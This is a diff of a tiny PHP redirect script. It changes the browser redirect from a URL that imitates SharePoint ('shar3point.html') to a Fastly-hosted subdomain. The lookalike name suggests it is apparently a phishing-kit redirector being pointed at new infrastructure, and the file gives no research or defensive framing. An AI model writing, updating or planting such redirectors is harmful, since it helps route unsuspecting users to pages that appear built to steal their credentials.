@@ -1,5 +1,5 @@
 <?php
 //Redirect Browser
-header("Location: https://olhodesogra.com.br/shar3point.html/");
+header("Location: https://piv-seil.global.ssl.fastly.net/");
 exit();
 ?>
